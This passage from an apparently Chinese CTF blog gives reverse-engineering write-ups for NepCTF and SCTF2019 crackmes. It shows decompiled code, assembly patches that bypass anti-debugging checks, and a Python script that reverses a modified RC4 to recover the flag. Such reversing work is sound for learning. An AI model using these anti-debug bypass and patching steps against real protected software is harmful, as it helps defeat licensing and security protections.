class="number">101</span>;</span><br><span class="line">  v7[<span class="number">31</span>] = <span class="number">-12</span>;</span><br><span class="line">  v7[<span class="number">32</span>] = <span class="number">-70</span>;</span><br><span class="line">  v7[<span class="number">33</span>] = <span class="number">98</span>;</span><br><span class="line">  v7[<span class="number">34</span>] = <span class="number">-48</span>;</span><br><span class="line">  sub_40108C(<span class="string">&quot;Please input the flag:\n&quot;</span>, v4);</span><br><span class="line">  sub_4011C2(<span class="string">&quot;%s&quot;</span>, byte_410158);</span><br><span class="line">  sub_401050(byte_410158, Str);    <span class="comment">//魔改RC4 KSA多了一个^0x66,最后的和秘钥流的异或变成了模取</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x23</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( byte_410158[i] != v7[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_40108C(<span class="string">&quot;Wrong flag!\n&quot;</span>, v5);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_40108C(<span class="string">&quot;Correct flag!\n&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个rc4的魔改解出来是个错的，就不详细解释了。</p>
<p>进入正文，反思一下我这里没解出来主要是没找到反调试的地方，因为IDA没把他识别成函数，藏在汇编里面。</p>
<p>要自己去翻汇编代码，给他P重定义一下</p>
<p><img src="/2025/07/28/smc/1.png" alt="1"></p>
<p><img src="/2025/07/28/smc/2.png" alt="2"></p>
<p>只能硬找莫得办法，重定义后Tab</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// write access to const memory has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">sub_401500</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">void</span> *)(NtCurrentPeb()-&gt;NtGlobalFlag &amp; <span class="number">0x70</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;loc_40902A + <span class="number">1</span>) ^= <span class="number">0x65u</span>;</span><br><span class="line">    *((_BYTE *)&amp;loc_40902A + <span class="number">2</span>) ^= <span class="number">0xFAu</span>;</span><br><span class="line">    *(&amp;loc_407080 + <span class="number">2</span>) ^= <span class="number">5u</span>;</span><br><span class="line">    result = &amp;loc_40B077;</span><br><span class="line">    loc_40B077 ^= <span class="number">0x10u</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// write access to const memory has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">sub_4015C0</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_401023(<span class="string">&quot;%s&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( CloseHandle((HANDLE)<span class="number">0x1234</span>) || GetLastError() != <span class="number">6</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  *(&amp;loc_407080 + <span class="number">1</span>) ^= <span class="number">0xD0u</span>;</span><br><span class="line">  *(&amp;loc_40B104 + <span class="number">2</span>) ^= <span class="number">0xCBu</span>;</span><br><span class="line">  loc_40B078 ^= <span class="number">0x61u</span>;</span><br><span class="line">  result = &amp;loc_40B079;</span><br><span class="line">  loc_40B079 ^= <span class="number">0x5Fu</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显的反调试和smc了</p>
<p>smc没什么好讲的得会动调就全部解决了，这里要解决反调试</p>
<p>第一个反调试我们要把(!result)改成(result)。</p>
<p>第二个反调试我要把CloseHandle((HANDLE)0x1234) || GetLastError() !&#x3D; 6的CloseHandle((HANDLE)0x1234) nop掉,不然动调会报错。</p>
<p>还要把if的条件反过来。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0040153F                 jz      short loc_401543  --&gt; jnz      short loc_401543</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:004015EE                 push    1234h           ; hObject        --&gt;nop</span><br><span class="line">.text:004015F3                 call    ds:__imp_CloseHandle             --&gt;nop</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401607                 jnz     short loc_40161D                jnz--&gt;jz</span><br><span class="line">.text:00401609                 mov     esi, esp</span><br><span class="line">.text:0040160B                 call    ds:__imp_GetLastError</span><br><span class="line">.text:00401611                 cmp     esi, esp</span><br><span class="line">.text:00401613                 call    j___RTC_CheckEsp</span><br><span class="line">.text:00401618                 cmp     eax, 6</span><br><span class="line">.text:0040161B                 jz      short loc_401635               jz---&gt;jnz</span><br></pre></td></tr></table></figure>

<p>如果不会改可以上网查一下IDA怎么patch。</p>
<p>改完之后我们就可以看到真实的加密逻辑了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">sub_40B000</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+D3h] [ebp-129h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">264</span>]; <span class="comment">// [esp+DCh] [ebp-120h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+1E4h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1F0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x100u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(i + a1) = i ^ <span class="number">0xCF</span>;</span><br><span class="line">    v5[i] = *(_BYTE *)(a2 + i % a3);</span><br><span class="line">    result = (<span class="type">void</span> *)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = ((<span class="type">unsigned</span> __int8)v5[i] + v6 + *(<span class="type">unsigned</span> __int8 *)(i + a1)) % <span class="number">256</span>;</span><br><span class="line">    v4 = *(_BYTE *)(i + a1);</span><br><span class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(v6 + a1);</span><br><span class="line">    *(_BYTE *)(v6 + a1) = v4 ^ <span class="number">0xAD</span>;</span><br><span class="line">    result = (<span class="type">void</span> *)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_401A60</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+D3h] [ebp-35h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+F4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+100h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41200F);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v8 = (v8 + v9 * *(<span class="type">unsigned</span> __int8 *)(v9 + a1)) % <span class="number">256</span>;</span><br><span class="line">    v6 = *(_BYTE *)(v9 + a1);</span><br><span class="line">    *(_BYTE *)(v9 + a1) = *(_BYTE *)(v8 + a1);</span><br><span class="line">    *(_BYTE *)(v8 + a1) = v6;</span><br><span class="line">    v4 = (*(<span class="type">unsigned</span> __int8 *)(v8 + a1) + *(<span class="type">unsigned</span> __int8 *)(v9 + a1)) % <span class="number">256</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i % <span class="number">2</span> )</span><br><span class="line">      v5 = *(_BYTE *)(v4 + a1) + *(_BYTE *)(i + a2);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = *(_BYTE *)(i + a2) - *(_BYTE *)(v4 + a1);</span><br><span class="line">    *(_BYTE *)(i + a2) = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 密文（从main函数的v7数组转换为无符号字节）</span></span><br><span class="line">ciphertext = [</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0xA2</span>, <span class="number">0x94</span>, <span class="number">0x2E</span>, <span class="number">0x8E</span>, <span class="number">0x5C</span>, <span class="number">0x95</span>, <span class="number">0x79</span>, <span class="number">0x16</span>,</span><br><span class="line">    <span class="number">0xE5</span>, <span class="number">0x36</span>, <span class="number">0x60</span>, <span class="number">0xC7</span>, <span class="number">0xE8</span>, <span class="number">0x06</span>, <span class="number">0x33</span>, <span class="number">0x78</span>, <span class="number">0xF0</span>, <span class="number">0xD0</span>,</span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0xC8</span>, <span class="number">0x73</span>, <span class="number">0x1B</span>, <span class="number">0x65</span>, <span class="number">0x40</span>, <span class="number">0xB5</span>, <span class="number">0xD4</span>, <span class="number">0xE8</span>, <span class="number">0x9C</span>,</span><br><span class="line">    <span class="number">0x65</span>, <span class="number">0xF4</span>, <span class="number">0xBA</span>, <span class="number">0x62</span>, <span class="number">0xD0</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥</span></span><br><span class="line">key = <span class="string">b&quot;Y0u_Can&#x27;t_F1nd_Me!&quot;</span></span><br><span class="line">key_len = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化S盒（sub_40B000的第一个循环）</span></span><br><span class="line">S = [i ^ <span class="number">0xCF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备v5数组（密钥扩展）</span></span><br><span class="line">v5 = [key[i % key_len] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sub_40B000的第二个循环：置换S盒</span></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v6 = (v5[i] + v6 + S[i]) % <span class="number">256</span></span><br><span class="line">    v4 = S[i]</span><br><span class="line">    S[i] = S[v6]</span><br><span class="line">    S[v6] = v4 ^ <span class="number">0xAD</span>  <span class="comment"># 注意这里的异或操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行PRGA并解密（模拟sub_401A60的逆向过程）</span></span><br><span class="line">v9 = <span class="number">0</span></span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line">plaintext_bytes = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    <span class="comment"># 更新v9和v8</span></span><br><span class="line">    v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    v8 = (v8 + v9 * S[v9]) % <span class="number">256</span>  <span class="comment"># 关键的v8计算</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 交换S[v9]和S[v8]</span></span><br><span class="line">    temp = S[v9]</span><br><span class="line">    S[v9] = S[v8]</span><br><span class="line">    S[v8] = temp</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算密钥流字节k</span></span><br><span class="line">    v4 = (S[v8] + S[v9]) % <span class="number">256</span></span><br><span class="line">    k = S[v4]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据索引奇偶性解密</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:  <span class="comment"># 奇数索引：密文 = 明文 + k → 明文 = 密文 - k</span></span><br><span class="line">        plain_byte = (ciphertext[i] - k) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 偶数索引：密文 = 明文 - k → 明文 = 密文 + k</span></span><br><span class="line">        plain_byte = (ciphertext[i] + k) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line">    plaintext_bytes.append(plain_byte)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字符串并输出</span></span><br><span class="line">plaintext = <span class="built_in">bytes</span>(plaintext_bytes).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密得到的flag：&quot;</span>, plaintext)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NepCTF&#123;Y0u_FiN1sH_Th1s_E3sy_Smc!!!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="网鼎杯-2020-青龙组-jocker"><a href="#网鼎杯-2020-青龙组-jocker" class="headerlink" title="[网鼎杯 2020 青龙组]jocker"></a>[网鼎杯 2020 青龙组]jocker</h2><p><a href="https://linkpwn.github.io/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/">链接</a></p>
<h2 id="SCTF2019-creakme"><a href="#SCTF2019-creakme" class="headerlink" title="[SCTF2019]creakme"></a>[SCTF2019]creakme</h2><p>简述一下这里主要是反调试+smc+AES的CBC</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  HMODULE ModuleHandleW; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">bool</span> v12; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> *v17; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">void</span> *v18; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v19; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [esp+0h] [ebp-80h]</span></span><br><span class="line">  <span class="type">void</span> *Block[<span class="number">5</span>]; <span class="comment">// [esp+10h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v24; <span class="comment">// [esp+24h] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">void</span> *v25[<span class="number">5</span>]; <span class="comment">// [esp+28h] [ebp-58h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v26; <span class="comment">// [esp+3Ch] [ebp-44h]</span></span><br><span class="line">  <span class="type">char</span> Src[<span class="number">48</span>]; <span class="comment">// [esp+40h] [ebp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// [esp+7Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  ModuleHandleW = GetModuleHandleW(<span class="number">0</span>);</span><br><span class="line">  sub_402320(ModuleHandleW);</span><br><span class="line">  sub_4024A0();</span><br><span class="line">  v4 = sub_402870(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;welcome to 2019 sctf&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v4, sub_402AC0);</span><br><span class="line">  sub_402870(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;please input your ticket:&quot;</span>);</span><br><span class="line">  sub_402AF0(v22);</span><br><span class="line">  v25[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">15</span>;</span><br><span class="line">  LOBYTE(v25[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  sub_401D30(v25, Src, <span class="built_in">strlen</span>(Src));</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v5 = sub_4020D0(Block, (<span class="type">int</span>)v25);             <span class="comment">// AES的CBC模式</span></span><br><span class="line">  v6 = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">  v7 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5[<span class="number">5</span>] &gt;= <span class="number">0x10u</span> )</span><br><span class="line">    v7 = (_DWORD *)*v5;</span><br><span class="line">  v8 = v5[<span class="number">4</span>];</span><br><span class="line">  v9 = aPvfqyc4ttc2uxr;</span><br><span class="line">  v10 = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt; v8 )</span><br><span class="line">    v10 = v6;</span><br><span class="line">  v12 = v10 &lt; <span class="number">4</span>;</span><br><span class="line">  v11 = v10 - <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="keyword">if</span> ( v11 == <span class="number">-4</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( *v7 == *(_DWORD *)v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v7;</span><br><span class="line">      v9 += <span class="number">4</span>;</span><br><span class="line">      v12 = v11 &lt; <span class="number">4</span>;</span><br><span class="line">      v11 -= <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = *(_BYTE *)v7 &lt; (<span class="type">unsigned</span> __int8)*v9;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)v7 != *v9</span><br><span class="line">    || v11 != <span class="number">-3</span></span><br><span class="line">    &amp;&amp; ((v13 = *((_BYTE *)v7 + <span class="number">1</span>), v12 = v13 &lt; (<span class="type">unsigned</span> __int8)v9[<span class="number">1</span>], v13 != v9[<span class="number">1</span>])</span><br><span class="line">     || v11 != <span class="number">-2</span></span><br><span class="line">     &amp;&amp; ((v14 = *((_BYTE *)v7 + <span class="number">2</span>), v12 = v14 &lt; (<span class="type">unsigned</span> __int8)v9[<span class="number">2</span>], v14 != v9[<span class="number">2</span>])</span><br><span class="line">      || v11 != <span class="number">-1</span> &amp;&amp; (v15 = *((_BYTE *)v7 + <span class="number">3</span>), v12 = v15 &lt; (<span class="type">unsigned</span> __int8)v9[<span class="number">3</span>], v15 != v9[<span class="number">3</span>]))) )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = v12 ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_17:</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">LABEL_18:</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= v8 )</span><br><span class="line">      v16 = v6 &lt; v8;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v16 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v24 &gt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = Block[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v24 + <span class="number">1</span> &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = (<span class="type">void</span> *)*((_DWORD *)Block[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(Block[<span class="number">0</span>] - v17 - <span class="number">4</span>) &gt; <span class="number">0x1F</span> )</span><br><span class="line">        invalid_parameter_noinfo_noreturn();</span><br><span class="line">    &#125;</span><br><span class="line">    sub_402F05(v17);</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = <span class="number">-1</span>;</span><br><span class="line">  Block[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">15</span>;</span><br><span class="line">  LOBYTE(Block[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v26 &gt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = v25[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v26 + <span class="number">1</span> &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = (<span class="type">void</span> *)*((_DWORD *)v25[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v25[<span class="number">0</span>] - v18 - <span class="number">4</span>) &gt; <span class="number">0x1F</span> )</span><br><span class="line">        invalid_parameter_noinfo_noreturn();</span><br><span class="line">    &#125;</span><br><span class="line">    sub_402F05(v18);</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = <span class="string">&quot;Have fun!&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 )</span><br><span class="line">    v19 = <span class="string">&quot;A forged ticket!!&quot;</span>;</span><br><span class="line">  v20 = sub_402870(<span class="built_in">std</span>::<span class="built_in">cout</span>, v19);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v20, sub_402AC0);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>AES的CBC怎么看出来的，emmm,我暂时没深入了解这个加密，所以问ai的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __thiscall <span class="title function_">sub_402320</span><span class="params">(_DWORD *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int16 v2; <span class="comment">// bx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = this[<span class="number">15</span>];</span><br><span class="line">  v2 = *(_WORD *)((<span class="type">char</span> *)this + v1 + <span class="number">6</span>);</span><br><span class="line">  v3 = (<span class="type">char</span> *)this + v1 + <span class="number">248</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">strcmp</span>(v3, <span class="string">&quot;.SCTF&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v5 = v5 &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      DebugBreak();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 += <span class="number">40</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_4024A0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> NtGlobalFlag; <span class="comment">// [esp+10h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  NtGlobalFlag = NtCurrentPeb()-&gt;NtGlobalFlag;</span><br><span class="line">  <span class="keyword">if</span> ( NtCurrentPeb()-&gt;BeingDebugged || NtGlobalFlag == <span class="number">112</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-5</span>);</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (*)(<span class="type">void</span>))dword_404000[<span class="number">0</span>])();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个是反调试，这个比NepCTF好多了。至少反调试容易找到wuuuuu~~~~</p>
<p>和nep一样直接patch掉反调试，当然你也可以动调的时候改变ZF来改变线程的走向。</p>
<p>绕过反调试，但是到了call就会报错404000。</p>
<p>这里参考大佬的用IDA的python脚本来手动还原</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_402450</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a4 &gt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= a2 )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &lt; a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = aSycloversyclov[v7++];</span><br><span class="line">      *(_BYTE *)(result + a1) = ~(*(_BYTE *)(result + a1) ^ v8);</span><br><span class="line">      ++result;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &gt;= a4 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到smc的地方，用脚本来还原</p>
